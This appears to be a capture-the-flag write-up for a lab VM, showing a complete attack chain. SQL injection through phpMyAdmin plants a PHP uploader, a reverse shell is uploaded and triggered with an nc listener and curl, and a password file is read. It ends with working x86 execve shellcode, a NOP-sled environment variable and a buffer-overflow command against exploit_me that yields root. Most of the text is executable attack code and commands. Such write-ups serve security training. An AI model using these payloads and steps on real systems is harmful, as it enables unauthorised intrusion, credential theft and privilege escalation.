# SHELLCODE

To do this writeup, we need to start as the writeup1 until the phpmyadmin step

With SQLI in phpmyadmin interface, we can add a page, that is a php uploader to help us for uploading files in the templates_c directory

The script is in ../scripts/uploader.php

Now upload ../scripts/reverse_shell.php on the server

In Kali linux, open 2 terminals.
In the first one, use "nc" to listen localhost on port 1234

```
nc -lvnp 1234
```

After that, in the second one, do a GET request with curl, on the the reverse_shell.php previously uploaded

```
curl --insecure https://10.0.2.10/forum/templates_c/reverse_shell.php
```

We now get a shell access, on the server, with www-data user.
And so cat the password as in the writeup1

```
cat home/LOOKATME/password
```

At this step, we can continu like in the writeup1 until connecting with zaz user.
When we are the ZAZ user, instead of the ret2libc attack we can use a SHELLCODE.

We can craft our shellcode, the script is in ../scripts/shellcode.s

```
global _start

section .text
_start:
    xor eax, eax        ; set eax to 0
    xor ecx, ecx        ; value to NULL to prevent misbehavior
    xor edx, edx        ; value to NULL to prevent misbehavior
    mov al, 11          ; execve syscall number
    push edx            ; push NULL string terminator
    mov ebx, '//sh'     ; first arg to /sh
    push ebx            ; push to stack
    mov ebx, '/bin'     ; first arg to /bin/sh
    push ebx            ; push to stack
    mov ebx, esp        ; move pointer to '/bin//sh'
    int    0x80         ; syscall
```

Lets extract our shellcode on bash
```
(nasm -f elf shellcode.s && ld -m elf_i386 -o shellcode shellcode.o)
count=0; for i in $(objdump -d shellcode |grep "^ " |cut -f2); do echo -n "\x$i"; count=$((count + 1)); done; echo; echo "$count bytes"
```

This give us
```
\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80
```

First we export our SHELLCODE:

	export SHELLCODE=`python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80"'`

Then to see where is the address of our env we launch ../scripts/get_shellcode_addr.sh
It gives us our shellcode address.

Then we use the bufferoverflow of exploit_me:

	./exploit_me `python -c "print 'A' * 140 + '<shellcode_addr>[::-1]'"` 

Congratulation, you are root!